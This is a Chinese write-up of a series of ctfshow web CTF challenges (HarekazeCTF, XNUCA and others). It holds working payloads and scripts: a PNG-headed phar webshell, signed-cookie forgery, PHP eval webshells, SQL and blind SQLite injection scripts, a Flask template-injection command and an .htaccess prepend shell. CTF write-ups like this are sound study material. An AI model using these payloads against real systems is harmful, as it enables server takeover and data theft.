// check file size
if ($_FILES['file']['size'] > 256000) {
  error('Uploaded file is too large.');
}

// check file type
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$type = finfo_file($finfo, $_FILES['file']['tmp_name']);
finfo_close($finfo);
if (!in_array($type, ['image/png'])) {
  error('Uploaded file is not PNG format.');
}

// check file width/height
$size = getimagesize($_FILES['file']['tmp_name']);
if ($size[0] > 256 || $size[1] > 256) {
  error('Uploaded image is too large.');
}
if ($size[2] !== IMAGETYPE_PNG) {
  // I hope this never happens...
  error('What happened...? </code>');
}

// ok
$filename = bin2hex(random_bytes(4)) . '.png';
move_uploaded_file($_FILES['file']['tmp_name'], UPLOAD_DIR . '/' . $filename);

$session->set('avatar', $filename);
flash('info', 'Your avatar has been successfully updated!');
redirect('/');
```

> 在检查文件类型时，`finfo_file()`函数检测上传图片的类型是否是`image/png`
> 在检查文件长宽时，`getimagesize()` 函数用于获取图像大小及相关信息，成功将返回个数组

Avatar Uploader 1的话只需要上传一个符合png文件头但不满足的png结构的文件即可获得flag

[HarekazeCTF 2019 Avatar Uploader 2(include phar+代码审计) | (guokeya.github.io)](https://guokeya.github.io/post/R-EENXBLc/)

不过本题是Avatar Uploader 2，考点是phar反序列化，重点看index.php和lib/session.php

```php
# session.php
class SecureClientSession {
  private $cookieName;
  private $secret;
  private $data;

  public function __construct($cookieName = 'session', $secret = 'secret') {
    $this->data = [];
    $this->secret = $secret;

    if (array_key_exists($cookieName, $_COOKIE)) {
      try {
        list($data, $signature) = explode('.', $_COOKIE[$cookieName]);
        # 以.号分割$_COOKIE[$cookieName]，将其分别赋给$data和$signature
        # 如session=aaa.bbb，那么$data=aaa;$signature=bbb
          
        # 调用了两个自写的加密算法 
        $data = urlsafe_base64_decode($data);
        $signature = urlsafe_base64_decode($signature);
    
        if ($this->verify($data, $signature)) {
          $this->data = json_decode($data, true);
        }
      } catch (Exception $e) {}
    }
  
    $this->cookieName = $cookieName;
  }
    ...
  private function verify($string, $signature) {
    # 用password_verify验证
    return password_verify($this->secret . $string, $signature);
  }

  private function sign($string) {
    # 利用password_hash加密(https://www.php.net/manual/zh/function.password-hash.php)
    return password_hash($this->secret . $string, PASSWORD_BCRYPT);
  }
    # 在php中，使用PASSWORD_BCRYPT 做算法，将使 password 参数最长为72个字符，超过会被截断。
    # 那么只要使得$data大于72，就可以使得签名始终正确；也就是说超出72的那部分可控
}       
```

```php
# util.php
function urlsafe_base64_encode($data) {
  return rtrim(str_replace(['+', '/'], ['-', '_'], base64_encode($data)), '=');
}

function urlsafe_base64_decode($data) {
  return base64_decode(str_replace(['-', '_'], ['+', '/'], $data) . str_repeat('=', 3 - (3 + strlen($data)) % 4));
}
```

再看index.php，存在一个可控的文件包含，利用的是session->get()，

而像这样拼接后缀的可以用zip://、phar://绕过；如构造成：phar://xxx/aaa

```php
# index.php

$avatar = $session->isset('avatar') ? 'uploads/' . $session->get('avatar') : 'default.png' ;

/* common.css */
<?php include('common.css'); ?>
/* light/dark.css */
<?php include($session->get('theme', 'light') . '.css'); ?>
```

```php
# session.php
  public function get($key, $defaultValue = null){
    if (!$this->isset($key)) {
      return $defaultValue;
    }
    return $this->data[$key];
  } 
```

先登录，随意上传个文件获取session，可以点击Toggle theme获取一个theme的键值，没有的话也可以后面加上

```json
eyJuYW1lIjoiYWRtaW5fYWRtaW4iLCJhdmF0YXIiOiI5ZWU2NWM3MS5wbmciLCJmbGFzaCI6eyJ0eXBlIjoiaW5mbyIsIm1lc3NhZ2UiOiJZb3VyIGF2YXRhciBoYXMgYmVlbiBzdWNjZXNzZnVsbHkgdXBkYXRlZCEifX0.JDJ5JDEwJHN5M3hRaVJjNlh6WnRvd3ovLi5MQXVTakRIOC9TUE0zNmZWYlJvVzcvTEo5NzRXRlBCRkZX
```

点号前为json数据，其后为签名；照上述所说，超出72的部分会被阶段，那么只需要对前面的数据进行修改再和签名拼接起来就可以成功通过验证

将点号前的部分base64解一下：

```
{"name":"admin_admin","avatar":"3c8a36d0.png","flash":{"type":"info","message":"Your avatar has been successfully updated!"}}
```

然后就是生成phar，再利用这个进行包含：（这里要绕过检测，加上png的文件头）

```php
<?php
$phar = new Phar('exp.phar');
$phar->startBuffering();
$phar->addFromString('exp.css', '<?php eval($_GET["cmd"]);?>');
$phar->setStub(chr(0x89).chr(0x50).chr(0x4e).chr(0x47).chr(0x0D).chr(0x0A).chr(0x1A).chr(0x0A).chr(0x00).chr(0x00).chr(0x00).chr(0x0D).chr(0x49).chr(0x48).chr(0x44).chr(0x52).chr(0x00).chr(0x00).chr(0x01).chr(0x00).chr(0x00).chr(0x00).chr(0x01).chr(0x00). '<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```

```php
<?php

function urlsafe_base64_encode($data) {
  return rtrim(str_replace(['+', '/'], ['-', '_'], base64_encode($data)), '=');
}

$a='{"name":"admin_admin","avatar":"9ee65c71.png","flash":{"type":"info","message":"Your avatar has been successfully updated!"},"theme":"phar://uploads/9ee65c71.png/exp"}';

print(urlsafe_base64_encode($a));
```

```
{"name":"admin_admin","avatar":"9ee65c71.png","flash":{"type":"info","message":"Your avatar has been successfully updated!"},"theme":"phar://uploads/9ee65c71.png/exp"}

session=eyJuYW1lIjoiYWRtaW5fYWRtaW4iLCJhdmF0YXIiOiI5ZWU2NWM3MS5wbmciLCJmbGFzaCI6eyJ0eXBlIjoiaW5mbyIsIm1lc3NhZ2UiOiJZb3VyIGF2YXRhciBoYXMgYmVlbiBzdWNjZXNzZnVsbHkgdXBkYXRlZCEifSwidGhlbWUiOiJwaGFyOi8vdXBsb2Fkcy85ZWU2NWM3MS5wbmcvZXhwIn0.JDJ5JDEwJHN5M3hRaVJjNlh6WnRvd3ovLi5MQXVTakRIOC9TUE0zNmZWYlJvVzcvTEo5NzRXRlBCRkZX
```

然后就可以找flag了，不过回显有点问题，所以用file_put_contents另外写了个马

`?cmd=file_put_contents('a.php','<?php eval($_POST[1])?>');`

![](https://s2.loli.net/2022/01/26/bt2GLVfCFDhKTOI.png)



## 703-[HarekazeCTF2019] Easy Notes

源码[HarekazeCTF2019-challenges/easy_notes/server](https://github.com/TeamHarekaze/HarekazeCTF2019-challenges/tree/master/easy_notes/server)

点击get flag提示非admin

登录处提示这样的格式：`/^[0-9A-Za-z_-]{4,64}$/`



看源码，$_SESSION['admin'] === true则获得flag

```php
# flag.php

if (is_admin()) {
    echo "Congratulations! The flag is: <code>" . getenv('FLAG') . "</code>";
}
```

```php
# lib.php

function is_admin() {
  if (!isset($_SESSION['admin'])) {
    return false;
  }
  return $_SESSION['admin'] === true;
}
```



```php
# init.php
require_once('config.php');
require_once('lib.php');

session_save_path(TEMP_DIR);
session_start();

# config.php
define('TEMP_DIR', '/var/www/tmp');
```

```php
# export.php

$filename = get_user() . '-' . bin2hex(random_bytes(8)) . '.' . $type;
$filename = str_replace('..', '', $filename); // avoid path traversal
$path = TEMP_DIR . '/' . $filename;

```



> [HarekazeCTF2019 Easy Notes_末初 · mochu7](https://blog.csdn.net/mochu7777777/article/details/107568406)
>
> 那么只需要创建一个用户名为： sess_
> PHP中默认`session.serialize_handler`默认设置为`php`，而这种引擎特点是即可使用`|`作为键值隔离符。利用`|`即可将序列化字符串拼接
> 然后Add note提交title为：`|N;admin|b:1;`，这样反序列化结果即可为：`admin==bool(true)`
> 最后`export.php?type=.`即可使得这个`.`与前面的`.`拼接成`..`被替换为空，$filename也就成为了session文件名了



网上的一次性脚本

```python
import re
import requests
URL = 'http://9a4a58cb-3fbf-4664-8b92-af85f695a519.challenge.ctf.show/'

while True:
    # login as sess_
    sess = requests.Session()
    sess.post(URL + 'login.php', data={
        'user': 'sess_'
    })

    # make a crafted note
    sess.post(URL + 'add.php', data={
        'title': '|N;admin|b:1;',
        'body': 'hello'
    })

    # make a fake session
    r = sess.get(URL + 'export.php?type=.').headers['Content-Disposition']
    print(r)
    
    sessid = re.findall(r'sess_([0-9a-z-]+)', r)[0]
    print(sessid)
    
    # get the flag
    r = requests.get(URL + '?page=flag', cookies={
        'PHPSESSID': sessid
    }).content.decode('utf-8')
    flag = re.findall(r'ctfshow\{.+\}', r)

    if len(flag) > 0:
        print(flag[0])
        break
```

## 704-[HarekazeCTF2019] encode_and_encode

```php
<?php
error_reporting(0);

if (!isset($_GET['source'])) {
  show_source(__FILE__);
  exit();
}

function is_valid($str) {
  $banword = [
    // no path traversal
    '\.\.',
    // no stream wrapper
    '(php|file|glob|data|tp|zip|zlib|phar):',
    // no data exfiltration
    'flag'
  ];
  $regexp = '/' . implode('|', $banword) . '/i';
  if (preg_match($regexp, $str)) {
    return false;
  }
  return true;
}

$body = file_get_contents('php://input');
$json = json_decode($body, true);

if (is_valid($body) && isset($json) && isset($json['page'])) {
  $page = $json['page'];
  $content = file_get_contents($page);
  if (!$content || !is_valid($content)) {
    $content = "<p>not found</p>\n";
  }
} else {
  $content = '<p>invalid request</p>';
}

// no data exfiltration!!!
$content = preg_replace('/ctfshow\{.+\}/i', 'ctfshow{&lt;censored&gt;}', $content);
echo json_encode(['content' => $content]);
```

1. JSON转义字符绕过
   在json中，字符Unicode编码之后等同于该字符，比如`php`等同于`\u0070\u0068\u0070`

   那么被过滤的东西用Unicode编码一下即可，然后就利用file_get_contents+伪协议即可

2. php伪协议

   ```
   php://filter/convert.base64-encode/resource=flag
   ```

   payload:

   ```
   GET: 
   ?source=1
   
   POST:
   {"page":"\u0070\u0068\u0070://filter/convert.base64-encode/resource=/\u0066\u006C\u0061\u0067"}
   ```

   

发现hackbar也可以用raw方式传了，不过要选这个enctype

![](https://s2.loli.net/2022/01/28/lxVKF1jeEaN43Gg.png)





## 705-[HarekazeCTF2019] Sqlite Voting



在source.code给出了源码

可以看到flag位于表flag中

```sql
/* schema.sql */
DROP TABLE IF EXISTS `vote`;
CREATE TABLE `vote` (
  `id` INTEGER PRIMARY KEY AUTOINCREMENT,
  `name` TEXT NOT NULL,
  `count` INTEGER
);
INSERT INTO `vote` (`name`, `count`) VALUES
  ('dog', 0),
  ('cat', 0),
  ('zebra', 0),
  ('koala', 0);

DROP TABLE IF EXISTS `flag`;
CREATE TABLE `flag` (
  `flag` TEXT NOT NULL
);
INSERT INTO `flag` VALUES ('ctfshow{<redacted>}');

```

vote中给出了查询语句，但是存在正则过滤

```php
# vote.php
<?php
error_reporting(0);

if (isset($_GET['source'])) {
  show_source(__FILE__);
  exit();
}

function is_valid($str) {
  $banword = [
    // dangerous chars
    // " % ' * + / < = > \ _ ` ~ -
    "[\"%'*+\\/<=>\\\\_`~-]",
    // whitespace chars
    '\s',
    // dangerous functions
    'blob', 'load_extension', 'char', 'unicode',
    '(in|sub)str', '[lr]trim', 'like', 'glob', 'match', 'regexp',
    'in', 'limit', 'order', 'union', 'join'
  ];
  $regexp = '/' . implode('|', $banword) . '/i';
  if (preg_match($regexp, $str)) {
    return false;
  }
  return true;
}

header("Content-Type: text/json; charset=utf-8");

// check user input
if (!isset($_POST['id']) || empty($_POST['id'])) {
  die(json_encode(['error' => 'You must specify vote id']));
}
$id = $_POST['id'];
if (!is_valid($id)) {
  die(json_encode(['error' => 'Vote id contains dangerous chars']));
}

// update database
$pdo = new PDO('sqlite:../db/vote.db');
$res = $pdo->query("UPDATE vote SET count = count + 1 WHERE id = ${id}");
if ($res === false) {
  die(json_encode(['error' => 'An error occurred while updating database']));
}

// succeeded!
echo json_encode([
  'message' => 'Thank you for your vote! The result will be published after the CTF finished.'
]);
```

update的结构不同会回显不一样的页面，由此进行盲注

具体分析看这里：[HarekazeCTF2019 web - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/6628#toc-4)

出题人的脚本改一下flag格式就行：

```python
# coding: utf-8
import binascii
import requests
import time
URL = 'http://d9fe34cb-16a0-4ced-b1b0-c148f901a439.challenge.ctf.show/vote.php'


l = 0
i = 0
for j in range(16):
  r = requests.post(URL, data={
    'id': f'abs(case(length(hex((select(flag)from(flag))))&{1<<j})when(0)then(0)else(0x8000000000000000)end)'
  })
  if b'An error occurred' in r.content:
    l |= 1 << j
print('[+] length:', l)


table = {}
table['A'] = 'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'
table['C'] = 'trim(hex(typeof(.1)),12567)'
table['D'] = 'trim(hex(0xffffffffffffffff),123)'
table['E'] = 'trim(hex(0.1),1230)'
table['F'] = 'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'
table['B'] = f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||{table["C"]}||{table["F"]})'


res = binascii.hexlify(b'ctfshow{').decode().upper()
for i in range(len(res), l):
  for x in '0123456789ABCDEF':
    t = '||'.join(c if c in '0123456789' else table[c] for c in res + x)
    r = requests.post(URL, data={
      'id': f'abs(case(replace(length(replace(hex((select(flag)from(flag))),{t},trim(0,0))),{l},trim(0,0)))when(trim(0,0))then(0)else(0x8000000000000000)end)'
    })
    if b'An error occurred' in r.content:
      res += x
      break
    time.sleep(0.5)
  print(f'[+] flag ({i}/{l}): {res}')
  i += 1
print('[+] flag:', binascii.unhexlify(res).decode())
```



## 707-[watevrCTF-2019] Cookie Store

点击购买flag，抓包

看cookie

![](https://s2.loli.net/2022/01/28/eUWoqcC9sSATh7m.png)

购买flag需要100，咱们只有50，修改后再发包：

```
eyJtb25leSI6IDEwMCwgImhpc3RvcnkiOiBbXX0=
```

在cookie中得到flag

![](https://s2.loli.net/2022/01/28/4vqVl6ufHyBNdjm.png) 



## 709-[RootersCTF2019] babyWeb

过滤了：`UNION` `SLEEP` `'` `"` `OR` `-` `BENCHMARK`

这里的话群主把题目改了一下，需要利用报错注入和load_file()读文件

读index.php会看到看到包含了一个`ctfshowflagyouneverknow.php`，读一下

```python
import requests

url = "http://fbfec5b3-e13c-4155-b9e0-3932a3abd251.challenge.ctf.show"

for i in range(100):
    # p = f"extractvalue(0x0a,concat(0x0a,(substr((select load_file(0x2F7661722F7777772F68746D6C2F696E6465782E706870)),{1+i*30},{31+i*30}))))"
    p = f"extractvalue(0x0a,concat(0x0a,(substr((select load_file(0x2F7661722F7777772F68746D6C2F63746673686F77666C6167796F756E657665726B6E6F772E706870)),{1+i*30},{31+i*30}))))"
    r = requests.get(url,params={'search':p})
    print(r.text[22:],end='')
```



## 710-flask-ssti

ssti模板注入，找参数找了一会。。

```
?name={{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('cat flag.txt').read()}}
```



## 711-jwt

1. 扫到robots.txt，得到/static/secretkey.txt -》`ctfshow_love_you`
2. 先注册登录，发现admin已经存在了，那就随便注册一个
3. 在cookie获得session_id，[jwt.io](https://jwt.io/)利用得到的key将user改为admin
4. 然后重新传入cookie就可以变更为admin了
5. 读取图片里的flag



## 712-[XNUCA2019] Ezphp

```php
<?php
    $files = scandir('./'); 
    foreach($files as $file) {
        if(is_file($file)){
            if ($file !== "index.php") {
                unlink($file);
            }
        }
    }

    include_once("fl3g.php");
    if(!isset($_GET['content']) || !isset($_GET['filename'])) {
        highlight_file(__FILE__);
        die();
    }

    $content = $_GET['content'];
    if(stristr($content,'on') || stristr($content,'html') || stristr($content,'type') || stristr($content,'flag') || stristr($content,'upload') || stristr($content,'file')) {
        echo "Hacker"; 
        die();
    }
    $filename = $_GET['filename'];
    if(preg_match("/[^a-z\.]/", $filename) !== 0) {
        echo "Hacker";
        die();
    }

    $files = scandir('./'); 
    foreach($files as $file) {
        if(is_file($file)){
            if ($file !== "index.php") {
                unlink($file);
            }
        }
    }
    file_put_contents($filename, $content . "\nJust one chance");
?>
```

文件上传，上传前后会删除当前目录下除了index.php的所有文件

且存在过滤；这里利用.htaccess包含来getshell，过滤的关键字部分用%0a换行绕过

> 可以指定某一个文件夹内的页面文件auto_prepend_file（顶部）与auto_append_file（底部）
>
> 在需要顶部或底部加载文件的文件夹中加入`.htaccess`文件，内容如下：
>
> ```
> php_value auto_prepend_file "xxx"
> php_value auto_append_file "xxx"
> ```

payload:

```
?filename=.htaccess&content=php_value auto_prepend_fi\%0ale ".htaccess" %0a%23<?php eval($_POST[1]);?>%0a%23\
```



## 715 - js

尝试在调试直接改数值，但是打赢了也会爆hacker；

战斗过程会由attrack记录为payload的值，战斗结束后计算签名checksum；

然后将payload和checksum一起发送到后端检测



那么可以在本地跑一个payload出来

```html
<html>

<head>
    <title>Sanity Check</title>
    <link href="/static/css/main.css" rel="stylesheet">
    <link href="https://unpkg.com/nes.css@2.3.0/css/nes.min.css" rel="stylesheet" />
    <link href="/static/css/style.css" rel="stylesheet" />
</head>
<body onload="play()">
    <div class="container">
        <div class="nes-container is-rounded">
            <div class="row">
                <div class="column">
                    <progress class="nes-progress is-error" value="90" max="100" id="player-sanity-bar"></progress>
                    <div id="player-sanity"></div>
                </div>
                <div class="column">
                    <progress class="nes-progress is-error flipped" value="95" max="100" id="cthulhu-sanity-bar"></progress>
                    <div id="cthulhu-sanity"></div>
                </div>
            </div>
            <hr>
            
            <section class="message-list" id="messages"></section>
        </div>
    </div>
    <form action="/" method="POST" style="display: none;">
        <input type="hidden" id="payload" name="payload">
        <input type="hidden" id="checksum" name="checksum">
        <input type="submit" id="submit">
    </form>
</body>
<script src="/static/js/core.js"  crossorigin="anonymous"></script>
<script src="/static/js/sha256.js" crossorigin="anonymous"></script>
<script>
let player = {
    id: 'Player',
    name: 'aaa',
    sanity: 100,
    speed: 100
}
let cthulhu = {
    id: 'Cthulhu',
    name: 'Cthulhu',
    sanity: 95,
    speed: 83
}
let intervals = []

function pad(num) {
    return ('000' + num.toString(10)).substr(-3)
}

function attack(from, to) {
    const roll = Math.ceil(Math.random() * 100)
    let deltaSanity
    if (to.sanity < roll) {
        deltaSanity = Math.ceil(Math.random() * 20)
    } else {
        deltaSanity = Math.ceil(Math.random() * 6)
    }
    to.sanity -= deltaSanity
    if (to.sanity <= 0) to.sanity = 0
    updateSanity(to)
    document.getElementById('payload').value += from.id[0] + pad(roll) + pad(deltaSanity)

    const balloon = `${from.name} has attacked ${to.name}. ${to.name} lost ${deltaSanity} sanity!`

    const message = document.createElement('div')
    message.innerText = balloon
    document.getElementById('messages').prepend(message)

    if (to.sanity === 0) endGame()
}

function endGame() {
    intervals.forEach(interval => clearInterval(interval))
    
    document.getElementById('checksum').value = CryptoJS.SHA256(document.getElementById('payload').value)
    setTimeout(() => document.getElementById('submit').click(), 1000)
}

function updateSanity(entity) {
    document.getElementById(`${entity.id.toLowerCase()}-sanity-bar`).value = entity.sanity
    document.getElementById(`${entity.id.toLowerCase()}-sanity`).innerText = `${entity.name}: ${entity.sanity}/100`
    if (entity.sanity === 0) document.getElementById(`${entity.id.toLowerCase()}-sanity`).style.color = 'red'
}

function play() {
    updateSanity(player)
    updateSanity(cthulhu)
    intervals = [
        setInterval(() => attack(player, cthulhu), 5),
        setInterval(() => attack(cthulhu, player), 30)
    ]
}
</script>
</html>

```

![](https://s2.loli.net/2022/03/09/GCxoX7HNdihrPMF.png)



在计算签名前加一个断点

![](https://s2.loli.net/2022/03/09/v9GjihxaBYqs5Ju.png)



把咱们胜利的value值替换掉再运行即可

![](https://s2.loli.net/2022/03/09/hvgUBbemMOnA2Q6.png)





![](https://s2.loli.net/2022/03/09/Oa5Yop7C9rRELz8.png)



## 718-[ISCC2017] 自相矛盾

```php
<?php
show_source(__FILE__);
error_reporting(0);

$v1=0;$v2=0;$v3=0;
$json=(array)json_decode(@$_GET['data']);


if(is_array($json)){
   is_numeric($json["part1"])?die("nope"):NULL;
   if(@$json["part1"]){
       ($json["part1"]>2021)?$v1=1:NULL;
   }
   if(is_array($json["part2"])){
       if(count($json["part2"])!==5 OR !is_array($json["part2"][0])) die("nope");
       $pos = array_search("show", $json["a2"]);
       $pos===false?die("nope"):NULL;
       foreach($json["part2"] as $key=>$val){
           $val==="show"?die("nope"):NULL;
       }
       $v2=1;
   }
}

$c=@$_GET['c'];
$d=@$_GET['d'];
if(@$c[1]){
   if(!strcmp($c[1],$d) && $c[1]!==$d){
       eregi("3|1|c",$d.$c[0])?die("nope"):NULL;
       strpos(($c[0].$d), "ctfshow")?$v3=1:NULL;
   }
}
if($v1 && $v2 && $v3){
   include "flag.php";
   echo $flag;
}
?>
```

- 以json形式传入
- part1要大于2021且能通过is_numeric()检测为数字：2022a
- part2要求是有5个元素的数组，且第一个元素为数组 

```php
       $pos = array_search("show", $json["a2"]);
       $pos===false?die("nope"):NULL;
       foreach($json["part2"] as $key=>$val){
           $val==="show"?die("nope"):NULL;
       }
```

这里利用弱比较的特性：字符串与0/true弱比较相等即可：`"a2":true`，不传入的话则为0，也能通过

```php
$c=@$_GET['c'];
$d=@$_GET['d'];
if(@$c[1]){
   if(!strcmp($c[1],$d) && $c[1]!==$d){
       eregi("3|1|c",$d.$c[0])?die("nope"):NULL;
       strpos(($c[0].$d), "ctfshow")?$v3=1:NULL;
   }
}
if($v1 && $v2 && $v3){
   include "flag.php";
   echo $flag;
}
```

- 要求$c[1]和$d不等，strcmp为弱比较
- eregi检测的是$d.$c[0]，可以令$d=%00截断
- 那么再传值$c[1]为数组，数组和字符串比较不等
- 令$c[0]="ctfshow"

最终：

```
?data={"part1":"2022a","part2":[[1],2,3,4,5],"a2":true}&c[0]="ctfshow"&c[1][]=&d=%00
```



## 720-sha1绕过

```php
<?php
error_reporting(0);
include "flag.php";

if (isset($_GET['name']) and isset($_GET['password'])) {
    if ($_GET['name'] == $_GET['password'])
        echo '<p>Your password can not be your name!</p>';
    else if (sha1($_GET['name']) === sha1($_GET['password']))
      die('Flag: '.$flag);
    else
        echo '<p>Invalid password.</p>';
}
else{
    highlight_file(__FILE__);
}
```

1. username不等于password
2. 二者sha1()后的值强相等

没ban数组，直接绕过就行

```
?name[]=1&password[]=2
```

如果ban了数组就用pdf：[ctf/Prudentialv2_Cloud_50.md at master · bl4de/ctf (github.com)](https://github.com/bl4de/ctf/blob/master/2017/BostonKeyParty_2017/Prudentialv2/Prudentialv2_Cloud_50.md)

```
import requests
import urllib.request

rotimi = urllib.request.urlopen("http://shattered.io/static/shattered-1.pdf").read()[:500];
letmein = urllib.request.urlopen("http://shattered.io/static/shattered-2.pdf").read()[:500];

r = requests.get('http://d576f0d8-1575-4578-a822-79364afbcaaf.challenge.ctf.show/', params={'name': rotimi, 'password': letmein});
print(r.text)
```

## 721

一个登录框，有提示

```php
# CTFSHOW hint: 
if (($row[pass]) && (!strcasecmp(md5($pass), $row[pass]))) {
	echo "<p>Logged in! ".$flag." </p>";
}
```

根据$row[pass]猜测会查询username和pass，尝试构造

```
username：a' union select md5(123)#
password：123
```

## 722

```php
# CTFSHOW hint: 
foreach ($_GET as $key => $value)
	$$key = $$value;
foreach ($_POST as $key => $value)
	$$key = $value;
if ( $_POST["flag"] !== $flag )
	die($fail);
echo "This is your flag : ". $flag . "\n";
	die($success);
```

很眼熟的变量覆盖

die($success)：

```
?success=flag
flag=
```

## 723

hint: so easy no hint

应该还是sql

确实不会整，看了g4师傅的wp，猜测语句为：

```php
sql="select * from user where username='".$username."' and password='".$password."';" 
```

用\将单引号转义，万能密码登录

```
useranme：1\
password：or 1=1#
```



## 724

```php
# CTFSHOW hint: 
eval('$code="'.addslashes($value).'";');
```

可以利用${}界定：`${phpinfo()}`

因为有addslashes进行转义，再嵌套一个eval好了

```
GET:?1=system('tac f*');
POST:value=${eval($_GET[1])}
```

